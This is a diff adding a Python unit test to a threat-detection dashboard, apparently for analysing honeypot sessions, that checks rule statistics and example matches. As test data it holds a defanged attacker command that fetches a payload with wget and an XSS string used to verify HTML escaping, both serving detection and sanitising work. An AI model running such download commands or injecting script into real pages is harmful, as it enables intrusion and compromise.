@@ -207,6 +207,25 @@ class DashboardBuildAndDataTests(unittest.TestCase):
         groups[0]['raws'] = ['<script>alert(1)</script>']
         self.assertIn('&lt;script&gt;', S.flow_html(groups))
 
+    def test_detection_page_data(self):
+        import detect as X
+        sc = D.scope(self.ds, self.f())
+        stats = X.behavior_stats(sc, self.rules).set_index('rule_id')
+        self.assertEqual(stats.loc['S01', 'sessions'], 1)
+        self.assertEqual(stats.loc['B11', 'step'], 'run')
+        self.assertAlmostEqual(stats.loc['B01', 'percent'], 50.0)  # 명령 세션 2개 중 1개(s1)
+        self.assertEqual(stats.loc['B04', 'sessions'], 0)
+        steps = X.step_sessions(sc, self.rules).set_index('step')
+        self.assertEqual(steps.loc['run', 'sessions'], 1)
+        ex = X.rule_examples(self.ds, sc, 'B08')
+        self.assertEqual(list(ex['command']), ['wget hxxp://45.90.x.x/p -O p'])
+        self.assertEqual(list(X.rule_sessions(sc, 'B01')['session_id']), ['s1'])
+        flows, rows = X.linked_flows(self.ds, sc)
+        self.assertEqual((flows.iloc[0]['rule_id'], flows.iloc[0]['target'], flows.iloc[0]['sessions']), ('S01', 'p', 1))
+        groups, raws, share = X.unmatched_inputs(self.ds, sc)
+        self.assertEqual(share, 0.0)  # 테스트 세션의 명령은 모두 규칙에 걸린다
+        self.assertTrue(groups.empty or groups['lines'].sum() == 0)
+
     def test_display_helpers(self):
         self.assertEqual(D.defang('a\x00 HTTPS://1.2.3.4/x'), 'a\\x00 hxxps://1.2.x.x/x')
         self.assertEqual(D.defang('tftp://1.2.3.4', mask_ips=False), 'txftp://1.2.3.4')
